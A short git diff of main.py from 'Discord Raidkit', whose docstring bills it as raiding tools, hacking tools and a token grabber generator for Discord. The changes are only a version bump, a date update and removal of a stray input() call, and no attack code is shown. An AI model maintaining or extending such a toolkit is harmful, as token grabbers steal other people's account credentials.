@@ -1,5 +1,5 @@
 """
-Discord Raidkit v2.3.1 — "The trojan horse of discord raiding"
+Discord Raidkit v2.3.2 — "The trojan horse of discord raiding"
 Copyright © 2022 the-cult-of-integral
 
 a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3
@@ -8,7 +8,7 @@ This program is under the GNU General Public License v2.0.
 https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE
 
 main.py runs the program.
-main.py was last updated on 06/09/22 at 18:18.
+main.py was last updated on 19/09/22 at 00:47.
 """
 
 import logging
@@ -79,7 +79,6 @@ def main() -> None:
         _ProactorBasePipeTransport.__del__)
 
     check_update(CURRENT_VERSION)
-    input()
 
     temp = ''
     while temp != '5':
